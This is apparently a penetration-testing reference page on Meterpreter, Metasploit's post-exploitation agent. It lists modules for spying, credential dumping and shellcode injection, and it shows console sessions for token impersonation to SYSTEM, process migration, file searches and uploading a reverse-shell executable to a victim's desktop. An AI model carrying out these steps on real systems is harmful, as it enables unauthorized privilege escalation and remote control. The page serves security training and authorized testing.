---
title: Meterpreter
description: Meterpreter C2 introduction.
---

# Meterpreter

## Modules

### List of modules

Meterpreter modules : [source code](https://github.com/rapid7/metasploit-framework/tree/master/lib/rex/post/meterpreter/ui/console/command_dispatcher).

- espia : Capture audio, video, screenshots from the remote system.
- [incognito](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/) : Allow you to impersonate user tokens.
- lanattacks
- [powershell](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/powershell-extension.html) : Enable powershell (interactive shell, single command, ...).
- [python](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/python-extension.html) : Interact with a python interpreter
- stdapi
- winpmem
- extapi
- kiwi : Mimikatz extension.
- peinjector : Inject a given shellcode into an executable file.
- priv : Privilege escalation extension.
- sniffer : Packet sniffer.
- unhook

### Incognito

```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
[...]
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Powershell

```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell

PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
[...]
```

## Migrate on process

More information about the [migrate](https://www.hackingarticles.in/metasploit-for-pentester-migrate/) command.

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions.

```
meterpreter > ps | grep services
Filtering on 'services'

Process List
============

 PID  PPID  Name          Arch  Session  User                 Path
 ---  ----  ----          ----  -------  ----                 ----
 668  580   services.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\services.exe

meterpreter > migrate 668
[*] Migrating from 996 to 668...
[*] Migration completed successfully.
```

## Search for files

```
meterpreter > search -f shell.exe
Found 1 result...
=================

Path                              Size (bytes)  Modified (UTC)
----                              ------------  --------------
c:\Users\bruce\Desktop\shell.exe  73802         2021-12-11 12:20:17 +0100
```

## Upload / Download

```
meterpreter > download shell.exe
[*] Downloading: shell.exe -> /home/.../alfred/shell.exe
[*] Downloaded 72.07 KiB of 72.07 KiB (100.0%): shell.exe -> /home/.../alfred/shell.exe
[*] download   : shell.exe -> /home/.../alfred/shell.exe

meterpreter > upload shell.exe 'c:\Users\bruce\Desktop\reverse.exe'
[*] uploading  : /home/.../alfred/shell.exe -> c:\Users\bruce\Desktop\reverse.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/.../alfred/shell.exe -> c:\Users\bruce\Desktop\reverse.exe
[*] uploaded   : /home/.../alfred/shell.exe -> c:\Users\bruce\Desktop\reverse.exe
```

## Pivoting / Autoroute

- https://www.tutorialspoint.com/metasploit/metasploit_pivoting.htm
- https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html#autoroute

## Socks proxy

- https://blog.pentesteracademy.com/socks4-proxy-pivoting-by-metasploit-74436b45392a
- https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html#socks-module